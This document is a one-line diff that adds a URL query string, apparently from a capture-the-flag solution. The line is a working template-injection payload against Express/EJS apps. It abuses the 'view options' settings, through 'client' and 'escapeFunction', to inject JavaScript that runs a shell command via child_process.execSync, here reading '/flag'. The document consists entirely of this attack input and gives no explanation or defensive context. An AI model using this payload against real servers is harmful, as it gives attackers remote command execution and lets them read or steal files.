@@ -1,0 +1,1 @@
+/?settings[view%20options][client]=true&settings[view%20options][escapeFunction]=1;return%20process.mainModule.require('child_process').execSync('cat%20/flag').toString();
